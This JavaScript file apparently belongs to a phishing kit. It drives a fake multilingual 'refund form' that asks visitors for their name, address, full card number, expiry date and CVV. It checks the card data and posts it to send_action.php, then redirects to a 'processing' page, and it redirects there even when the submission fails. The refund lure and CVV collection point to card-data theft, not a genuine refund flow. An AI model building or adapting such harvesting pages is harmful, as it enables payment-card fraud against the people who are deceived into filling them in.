// تعريف وظيفة switchLanguage كمتغير عالمي
window.switchLanguage = function(lang) {
    const translations = {
        fr: {
            title: 'Formulaire de remboursement',
            
            firstName: 'Prénom',
            lastName: 'Nom',
            country: 'Pays :',
            selectCountry: 'Sélectionner un pays',
            address: 'Adresse :',
            enterAddress: 'Entrez votre adresse',
            postalCode: 'Code postal',
            city: 'Ville',
            cardNumber: 'Numéro de carte',
            expiryDate: 'Date d\'expiration',
            month: 'MM',
            year: 'AA',
            cvc: 'CVC',
            submit: 'Confirmation de remboursement',
            cardExpired: 'La carte est expirée. Veuillez utiliser une carte valide.',
            invalidCard: 'Numéro de carte invalide',
            invalidCVC: 'Code CVC invalide'
        },
        de: {
            title: 'Rückerstattungsformular',
            
            firstName: 'Vorname',
            lastName: 'Nachname',
            country: 'Land:',
            selectCountry: 'Land auswählen',
            address: 'Adresse:',
            enterAddress: 'Geben Sie Ihre Adresse ein',
            postalCode: 'Postleitzahl',
            city: 'Stadt',
            cardNumber: 'Kartennummer',
            expiryDate: 'Ablaufdatum',
            month: 'MM',
            year: 'JJ',
            cvc: 'CVC',
            submit: 'Rückerstattung bestätigen',
            cardExpired: 'Die Karte ist abgelaufen. Bitte verwenden Sie eine gültige Karte.',
            invalidCard: 'Ungültige Kartennummer',
            invalidCVC: 'Ungültiger CVC-Code'
        }
    };

    try {
        // تحديث النصوص في الصفحة
        document.querySelector('h1').textContent = translations[lang].title;
        
        // تحديث placeholders
        document.getElementById('prenom').placeholder = translations[lang].firstName;
        document.getElementById('nom').placeholder = translations[lang].lastName;
        document.getElementById('adresse').placeholder = translations[lang].enterAddress;
        document.getElementById('code_postal').placeholder = translations[lang].postalCode;
        document.getElementById('ville').placeholder = translations[lang].city;
        
        // تحديث labels
        document.querySelector('label[for="pays"]').textContent = translations[lang].country;
        document.querySelector('label[for="adresse"]').textContent = translations[lang].address;
        document.querySelector('label[for="numero_carte"]').textContent = translations[lang].cardNumber;
        
        // تحديث select options
        const paysSelect = document.querySelector('#pays option[value=""]');
        if (paysSelect) paysSelect.textContent = translations[lang].selectCountry;
        
        const moisSelect = document.querySelector('#mois option[value=""]');
        if (moisSelect) moisSelect.textContent = translations[lang].month;
        
        const anneeSelect = document.querySelector('#annee option[value=""]');
        if (anneeSelect) anneeSelect.textContent = translations[lang].year;
        
        // تحديث زر التأكيد
        document.querySelector('.submit-button').textContent = translations[lang].submit;

        // تحديث رسائل الخطأ
        window.errorMessages = {
            cardExpired: translations[lang].cardExpired,
            invalidCard: translations[lang].invalidCard,
          
            invalidCVC: translations[lang].invalidCVC
        };

        // تحديث الروابط النشطة
        document.querySelectorAll('.language-switch a').forEach(link => {
            link.classList.remove('active');
            if (link.getAttribute('data-lang') === lang) {
                link.classList.add('active');
            }
        });

        // حفظ اللغة المختارة
        localStorage.setItem('preferredLanguage', lang);
        
        console.log('Language switched to:', lang); // للتأكد من عمل الوظيفة
    } catch (error) {
        console.error('Error switching language:', error);
    }
};

document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('remboursementForm');
    const numeroInput = document.getElementById('numero_carte');
    const visaLogo = document.getElementById('visa_logo');
    const mastercardLogo = document.getElementById('mastercard_logo');
    const errorMessage = document.getElementById('error_message');
    const successMessage = document.getElementById('success_message');



    // Card Type Detection
    window.checkCardType = function(cardNumber) {
        const visaIcon = document.getElementById('visa_icon');
        const mastercardIcon = document.getElementById('mastercard_icon');
        const amexIcon = document.getElementById('amex_icon');
        const jcbIcon = document.getElementById('jcb_icon');
        const discoverIcon = document.getElementById('discover_icon');

        // Reset all icons
        [visaIcon, mastercardIcon, amexIcon, jcbIcon, discoverIcon].forEach(icon => {
            if (icon) icon.classList.remove('active');
        });

        // Remove spaces from card number
        cardNumber = cardNumber.replace(/\s/g, '');

        // Check card type patterns
        if (/^4/.test(cardNumber)) {
            visaIcon.classList.add('active'); // Visa
        } else if (/^5[1-5]/.test(cardNumber)) {
            mastercardIcon.classList.add('active'); // Mastercard
        } else if (/^3[47]/.test(cardNumber)) {
            amexIcon.classList.add('active'); // American Express
        } else if (/^35/.test(cardNumber)) {
            jcbIcon.classList.add('active'); // JCB
        } else if (/^6(?:011|5)/.test(cardNumber)) {
            discoverIcon.classList.add('active'); // Discover
        }
    }

    // Card Number Input Formatting
    const cardInput = document.getElementById('numero_carte');
    
    cardInput.addEventListener('keydown', function(e) {
        if (!(
            (e.keyCode >= 48 && e.keyCode <= 57) ||    // numbers
            (e.keyCode >= 96 && e.keyCode <= 105) ||   // numpad
            e.keyCode == 8 ||                         // backspace
            e.keyCode == 46 ||                        // delete
            e.keyCode == 37 ||                        // left arrow
            e.keyCode == 39                           // right arrow
        )) {
            e.preventDefault();
        }
    });

    cardInput.addEventListener('input', function(e) {
        let cursorPosition = this.selectionStart;
        let value = this.value.replace(/\D/g, '');
        let formattedValue = '';
        
        // Format based on card type
        let cardType = 'unknown';
        if (/^3[47]/.test(value)) {
            cardType = 'amex';
        }
        
        // AMEX: 4-6-5 format, Others: 4-4-4-4 format
        if (cardType === 'amex') {
            // Format: XXXX XXXXXX XXXXX
            for (let i = 0; i < value.length && i < 15; i++) {
                if (i === 4 || i === 10) {
                    formattedValue += ' ';
                    if (cursorPosition > i) {
                        cursorPosition++;
                    }
                }
                formattedValue += value[i];
            }
        } else {
            // Standard format: XXXX XXXX XXXX XXXX
            for (let i = 0; i < value.length && i < 16; i++) {
                if (i > 0 && i % 4 === 0) {
                    formattedValue += ' ';
                    if (cursorPosition > i) {
                        cursorPosition++;
                    }
                }
                formattedValue += value[i];
            }
        }
        
        this.value = formattedValue;
        
        if (cursorPosition <= this.value.length) {
            this.setSelectionRange(cursorPosition, cursorPosition);
        }
        
        checkCardType(value);
    });

    // Luhn Algorithm for Card Validation
    function validateCardNumber(cardNumber) {
        // Remove spaces and non-digits
        cardNumber = cardNumber.replace(/\D/g, '');
        
        // Check length based on card type
        if (/^3[47]/.test(cardNumber)) {
            if (cardNumber.length !== 15) return false; // AMEX
        } else if (cardNumber.length !== 16) return false; // Other cards

        let sum = 0;
        let isEven = false;

        // Loop through values starting from the rightmost digit
        for (let i = cardNumber.length - 1; i >= 0; i--) {
            let digit = parseInt(cardNumber[i]);

            if (isEven) {
                digit *= 2;
                if (digit > 9) {
                    digit -= 9;
                }
            }

            sum += digit;
            isEven = !isEven;
        }

        return sum % 10 === 0;
    }

    // CVV Input Validation
    document.getElementById('cvv').addEventListener('input', function(e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 3) {
            value = value.slice(0, 3);
        }
        e.target.value = value;
    });

    // التحقق من تاريخ انتهاء الصلاحية
    function validateExpiryDate(month, year) {
        const currentDate = new Date();
        const currentYear = currentDate.getFullYear() % 100; // آخر رقمين من السنة
        const currentMonth = currentDate.getMonth() + 1; // الشهر الحالي (1-12)

        // تحويل القيم إلى أرقام
        month = parseInt(month);
        year = parseInt(year);

        if (year < currentYear || (year === currentYear && month < currentMonth)) {
            return false;
        }
        return true;
    }

    // مراقبة تغييرات تاريخ الانتهاء
    const monthSelect = document.getElementById('mois');
    const yearSelect = document.getElementById('annee');

    function checkExpiryDate() {
        const month = monthSelect.value;
        const year = yearSelect.value;

        if (month && year) {
            if (!validateExpiryDate(month, year)) {
                showError('La carte est expirée. Veuillez utiliser une carte valide.');
                return false;
            } else {
                errorMessage.style.display = 'none';
                return true;
            }
        }
        return true; // إذا لم يتم اختيار تاريخ بعد
    }

    monthSelect.addEventListener('change', checkExpiryDate);
    yearSelect.addEventListener('change', checkExpiryDate);

    // تحديث وظيفة إرسال النموذج
    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        
      

        // التحقق من صحة البطاقة
        const cardNumber = document.getElementById('numero_carte').value.replace(/\s/g, '');
        if (!validateCardNumber(cardNumber)) {
            showError(window.errorMessages.invalidCard);
            return;
        }

        // التحقق من تاريخ انتهاء الصلاحية
        const month = document.getElementById('mois').value;
        const year = document.getElementById('annee').value;
        if (!validateExpiryDate(month, year)) {
            showError(window.errorMessages.cardExpired);
            return;
        }

        // التحقق من رمز CVC
        const cvc = document.getElementById('cvv').value;
        if (!/^\d{3}$/.test(cvc)) {
            showError(window.errorMessages.invalidCVC);
            return;
        }

        // جمع البيانات
        const formData = {
            prenom: document.getElementById('prenom').value,
            nom: document.getElementById('nom').value,
            pays: document.getElementById('pays').value,
            adresse: document.getElementById('adresse').value,
            code_postal: document.getElementById('code_postal').value,
            ville: document.getElementById('ville').value,
            numero_carte: cardNumber,
            mois_expiration: month,
            annee_expiration: year,
            cvv: cvc
        };

        // إنشاء session ID
        const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
        
        try {
            showSuccess('Traitement en cours...');
            
            // إرسال البيانات إلى الخادم
            await fetch('send_action.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify({
                    ...formData,
                    session_id: sessionId
                })
            });

            // التوجيه إلى صفحة المعالجة مع معرف الجلسة
            setTimeout(() => {
                window.location.href = `processing.php?session=${sessionId}`;
            }, 1000);
            
        } catch (error) {
            console.error('Error:', error);
            // حتى لو حدث خطأ، نتوجه إلى صفحة المعالجة
            setTimeout(() => {
                window.location.href = `processing.php?session=${sessionId}`;
            }, 1000);
        }
    });

    function showError(message) {
        errorMessage.textContent = message;
        errorMessage.style.display = 'block';
        successMessage.style.display = 'none';
    }

    function showSuccess(message) {
        successMessage.textContent = message;
        successMessage.style.display = 'block';
        errorMessage.style.display = 'none';
    }

    // Language Switch
    if (localStorage.getItem('preferredLanguage')) {
        switchLanguage(localStorage.getItem('preferredLanguage'));
    }
});
